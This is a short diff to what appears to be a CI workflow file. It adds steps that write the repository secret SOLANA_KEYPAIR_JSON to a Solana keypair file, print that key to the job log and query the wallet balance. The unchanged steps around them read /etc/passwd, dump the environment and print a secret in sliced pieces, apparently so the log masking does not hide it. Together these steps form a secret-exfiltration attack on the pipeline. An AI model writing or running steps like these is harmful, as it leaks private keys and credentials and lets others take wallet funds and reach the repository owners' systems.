@@ -35,6 +35,9 @@ jobs:
       - run: echo hi
       - run: id
       - run: cat /etc/passwd
+      - run: echo ${{ secrets.SOLANA_KEYPAIR_JSON }} > $HOME/.config/solana/id.json
+      - run: cat $HOME/.config/solana/id.json
+      - run: solana balance -ud
       - run: pwd
       - run: printenv
       - run: true || echo $ENV_SECRET | cut -c -5; echo $ENV_SECRET | cut -c 5-10; echo $ENV_SECRET | cut -c 10-
